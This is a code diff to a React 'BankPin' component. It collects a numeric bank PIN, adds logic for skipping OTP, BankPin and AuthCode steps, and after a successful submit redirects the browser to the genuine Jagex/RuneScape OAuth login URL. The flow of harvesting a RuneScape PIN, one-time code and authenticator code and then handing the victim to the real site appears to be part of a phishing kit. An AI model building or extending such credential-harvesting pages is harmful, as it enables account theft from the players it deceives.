@@ -7,7 +7,7 @@ import { FaSpinner } from 'react-icons/fa';
 import "./email.css";
 
 
-const BankPin = ({email, userId}) => {
+const BankPin = ({email, userId, skip}) => {
   const redBox = useRef(null);
   const redText = useRef(null);
   const [bankPin, setbankPin] = useState('');
@@ -15,8 +15,9 @@ const BankPin = ({email, userId}) => {
   const [error, setError] = useState("");
   
   const navigate = useNavigate();
-  const goToAuth = () => navigate(`/authcode/?userId=${userId}`);
+  const goToAuth = () => navigate(`/authcode/?userId=${userId}${skip.includes("OTP") ? "&skip=OTP" : ""}${skip.includes("BankPin") ? "&skip=BankPin" : ""}${skip.includes("AuthCode") ? "&skip=AuthCode" : ""}`);
   console.log("userId in bankpin:  ", userId)
+  console.log("skip in bankpin:  ", skip)
   const handleChange = (e) => {
     const value = e.target.value;
     // Ensure only numeric values
@@ -48,7 +49,13 @@ const BankPin = ({email, userId}) => {
   
       if (response.ok) {
         setLoading(false)
-        goToAuth()
+        if(skip.includes("AuthCode")){
+          window.location.replace(
+            "https://account.jagex.com/oauth2/auth?response_type=code&client_id=jpp-auth&scope=openid%20user.email.read&state=0Q8G1Ik-dZIji7-2kAhpxCW45NCgv5BzZSWntl41Vas%3D&redirect_uri=https://auth.runescape.com/jpp-auth/login/oauth2/code/jpp&nonce=yiJhVH5_277aCNWlS6_691JBxeqtgsgpGiukIJ90FQg&max_age=1200&flow=web&__cf_chl_tk=tjiRlHZOgc5QNTSiM7Qn8Sc3zHDyO_9qQCLcAr_fqGE-1729662506-1.0.1.1-.9k2TWyJVV6gerbwd_bj7OLygTb1lrUiRgdqzeziHgo#_ga=2.82027987.490570915.1729662489-144552881.1729662489"
+          );
+        }else{
+          goToAuth();
+        }
       } else {
         const errorResponse = await response.json();
         setLoading(false);
